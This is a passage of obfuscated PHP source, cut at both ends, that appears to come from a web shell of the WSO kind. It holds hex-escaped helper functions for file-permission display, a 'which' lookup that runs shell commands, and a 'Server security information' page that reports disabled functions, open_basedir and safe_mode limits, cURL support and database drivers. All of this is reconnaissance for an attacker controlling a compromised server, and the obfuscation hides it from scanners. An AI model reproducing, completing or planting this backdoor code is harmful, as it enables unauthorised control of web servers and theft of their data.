x4cO\x42\x41\x4cS"}["l\x6d\x69f\x68\x6f\x67h\x78\x61\x71\x78"]}&0x0002)?"w":"-");${${"\x47\x4c\x4f\x42AL\x53"}["\x64gt\x63\x66h\x63"]}.=((${${"\x47\x4cOB\x41\x4c\x53"}["g\x72g\x6ao\x72fg"]}&0x0001)?((${${"\x47L\x4fB\x41LS"}["\x67r\x67\x6a\x6f\x72\x66g"]}&0x0200)?"t":"x"):((${${"\x47\x4c\x4fB\x41\x4cS"}["\x67r\x67\x6ao\x72\x66\x67"]}&0x0200)?"T":"-"));return${${"\x47\x4cOB\x41\x4c\x53"}["\x64g\x74c\x66\x68\x63"]};}function viewPermsColor($f){$qvbpxdofxs="f";$hzndafnl="f";$ssdslibco="\x66";if(!@is_readable(${$ssdslibco}))return"<\x66o\x6et\x20co\x6cor=#\x46\x460\x30\x30\x30>\x3c\x62>".perms(@fileperms(${$qvbpxdofxs}))."</b\x3e\x3c/f\x6fnt\x3e";elseif(!@is_writable(${${"\x47LO\x42A\x4cS"}["\x6f\x6d\x6fa\x74\x6c\x67al\x71"]}))return"\x3c\x66\x6fn\x74\x20c\x6f\x6c\x6fr=\x77h\x69\x74e><\x62\x3e".perms(@fileperms(${${"GLO\x42\x41\x4cS"}["o\x6d\x6fa\x74l\x67\x61\x6c\x71"]}))."\x3c/\x62>\x3c/\x66ont\x3e";else return"<f\x6f\x6et \x63olo\x72\x3d#00A8\x41\x38\x3e\x3c\x62>".perms(@fileperms(${$hzndafnl}))."</\x62></\x66on\x74>";}if(!function_exists("sc\x61ndir")){function scandir($dir){${"G\x4cO\x42\x41\x4cS"}["\x6a\x75h\x63\x61wx\x70\x61\x6b\x6c"]="\x64h";$lvygknuhds="\x64\x69\x72";${${"G\x4cO\x42\x41\x4c\x53"}["\x6a\x75h\x63\x61\x77xp\x61k\x6c"]}=opendir(${$lvygknuhds});$mjucderxekj="\x66\x69\x6cen\x61m\x65";$nrhutwjhjho="fi\x6c\x65\x73";while(false!==(${$mjucderxekj}=readdir(${${"\x47LO\x42AL\x53"}["m\x68\x6dykpl\x6csl"]}))){${"G\x4c\x4fBA\x4c\x53"}["t\x6f\x76\x63\x77i"]="f\x69le\x6eame";${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x79\x67\x6cd\x64\x64\x6cf\x73o\x69"]}[]=${${"\x47\x4c\x4fB\x41\x4cS"}["t\x6f\x76c\x77\x69"]};}return${$nrhutwjhjho};}}function which($p){$dfsvgprws="\x70\x61\x74\x68";$yugoksnirbkn="\x70a\x74\x68";${"\x47LO\x42A\x4c\x53"}["t\x67\x66\x73y\x6a\x6f\x6c"]="\x70ath";${${"\x47\x4cOBAL\x53"}["tgfs\x79j\x6fl"]}=ex("\x77\x68i\x63h ".${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x67\x72\x67\x6a\x6f\x72\x66g"]});if(!empty(${$dfsvgprws}))return${$yugoksnirbkn};return false;}function actionSecInfo(){printHeader();echo"\x3c\x68\x31>\x53\x65\x72\x76\x65r\x20\x73\x65cu\x72\x69\x74\x79 i\x6ef\x6frmat\x69o\x6e</\x681\x3e<\x64\x69\x76 cl\x61\x73s=\x63\x6fnt\x65n\x74\x3e";$jfiydmuji="\x74\x65\x6d\x70";function showSecParam($n,$v){${${"GL\x4f\x42\x41LS"}["\x64\x6enr\x6bj\x75\x73\x6a"]}=trim(${${"\x47L\x4f\x42A\x4c\x53"}["\x64n\x6e\x72\x6b\x6a\x75\x73\x6a"]});if(${${"\x47L\x4fB\x41\x4c\x53"}["\x64n\x6er\x6bj\x75\x73\x6a"]}){$loulrgpu="\x76";${"G\x4c\x4fBA\x4cS"}["o\x79n\x63w\x63"]="\x76";$olrtuwftfx="n";echo"\x3cspan\x3e".${$olrtuwftfx}.": \x3c/\x73\x70\x61n\x3e";$pcggqtwxln="v";if(strpos(${$loulrgpu},"\n")===false)echo${$pcggqtwxln}."\x3c\x62r>";else echo"<\x70r\x65\x20\x63\x6ca\x73\x73\x3d\x6dl1\x3e".${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x6fy\x6ec\x77c"]}."</\x70r\x65\x3e";}}showSecParam("Server so\x66\x74\x77ar\x65",@getenv("S\x45RV\x45R\x5f\x53O\x46T\x57AR\x45"));showSecParam("D\x69\x73a\x62le\x64 \x50H\x50 F\x75n\x63t\x69on\x73",($GLOBALS["di\x73\x61b\x6c\x65_\x66\x75\x6ec\x74io\x6e\x73"])?$GLOBALS["\x64is\x61\x62le_funct\x69\x6f\x6es"]:"\x6eo\x6e\x65");$irfvysogjjv="\x74\x65\x6d\x70";${"\x47\x4c\x4f\x42\x41\x4cS"}["\x64\x66d\x63\x6bxu\x61"]="\x74em\x70";showSecParam("\x4fp\x65n b\x61s\x65 \x64\x69r",@ini_get("\x6fp\x65\x6e\x5fb\x61\x73e\x64\x69r"));showSecParam("\x53a\x66e \x6d\x6f\x64\x65\x20\x65xe\x63 \x64i\x72",@ini_get("\x73\x61\x66e\x5fmo\x64e\x5fe\x78\x65\x63_\x64\x69r"));$tctjaejlgt="\x74\x65\x6dp";showSecParam("\x53a\x66\x65\x20m\x6fd\x65\x20i\x6ec\x6cude \x64\x69\x72",@ini_get("\x73\x61f\x65_m\x6f\x64\x65_in\x63l\x75d\x65\x5fd\x69r"));showSecParam("\x63\x55\x52L sup\x70o\x72\x74",function_exists("\x63\x75\x72l_\x76e\x72sio\x6e")?"\x65na\x62\x6ced":"\x6eo");${${"G\x4c\x4fBAL\x53"}["a\x74\x66h\x73\x6ct\x6f\x67\x74"]}=array();if(function_exists("\x6d\x79\x73\x71l_ge\x74_c\x6cien\x74_\x69n\x66\x6f"))${$jfiydmuji}[]="My\x53\x71l (".mysql_get_client_info().")";if(function_exists("m\x73\x73\x71\x6c_con\x6eect"))${$tctjaejlgt}[]="\x4d\x53\x53\x51\